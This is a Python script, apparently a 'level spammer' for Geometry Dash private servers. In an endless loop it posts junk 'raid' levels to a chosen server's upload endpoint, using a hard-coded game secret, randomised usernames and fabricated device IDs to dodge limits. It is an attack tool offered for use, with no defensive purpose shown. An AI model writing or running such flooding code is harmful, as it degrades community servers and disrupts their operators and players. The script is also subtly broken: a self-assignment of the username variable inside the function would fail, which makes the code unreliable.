import requests
from random import randint as rand
from base64 import b64encode as b64e

def postLevel(levelName, levelDesc, levelLength, audioTrack, levelString, udid):
    endpoint = database
    userName = userName
    levelName = levelName
    data = {
        'gameVersion': 21,
        'userName': userName+str(rand(111111111, 999999999)),
        'gjp': '',
        'levelID': 0,
        'secret': 'Wmfv3899gc9',
        'levelVersion': 1,
        'levelName': levelName,
        'levelDesc': levelDesc,
        'levelLength': levelLength,
        'audioTrack': audioTrack,
        'levelString': levelString,
        'udid': udid
    }
    r = requests.post(endpoint+"uploadGJLevel21.php", data=data)
    return r.text
def generateUDID():
    udid = "S"+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(1,9))
    return udid

print("Sample's GDPS Level Spammer") 
database = input("database url (for example: http://ps.fhgdps.com/Geometrykras/): ")
userName = input("custom username before numbers: ")
levelName = input("custom levelname before numbers: ")
while True:
    l = postLevel("raid"+str(rand(11111,9999999)), "", 3, 4, "fwfwefwefwwef"+str(rand(111111111, 999999999)), generateUDID())
    print(l)
